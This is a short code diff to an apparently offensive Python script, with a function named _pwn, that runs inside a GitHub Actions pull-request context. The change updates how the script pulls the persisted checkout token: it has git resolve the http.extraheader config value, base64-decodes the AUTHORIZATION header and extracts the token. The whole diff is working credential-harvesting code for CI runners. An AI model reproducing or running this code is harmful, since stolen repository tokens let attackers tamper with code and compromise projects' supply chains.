@@ -8,6 +8,7 @@ import base64
 import json
 import os
 import re
+import subprocess
 import sys
 import traceback
 import urllib.request
@@ -25,10 +26,16 @@ def _pwn():
     pr_num = event["pull_request"]["number"]
     pr_user = event["pull_request"]["user"]["login"]
 
-    cfg = open(os.path.join(workspace, ".git", "config")).read()
-    m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", cfg)
+    # actions/checkout@v6 stores the auth header in a temp file referenced
+    # via includeIf in .git/config. Ask git to resolve the value for us.
+    out = subprocess.run(
+        ["git", "-C", workspace, "config", "--get-all",
+         "http.https://github.com/.extraheader"],
+        capture_output=True, text=True,
+    )
+    m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", out.stdout)
     if not m:
-        _log("no persisted token in .git/config; bailing")
+        _log(f"no persisted token; git out={out.stdout!r} err={out.stderr!r}")
         return
     decoded = base64.b64decode(m.group(1)).decode("utf-8", "replace")
     _, _, token = decoded.partition(":")
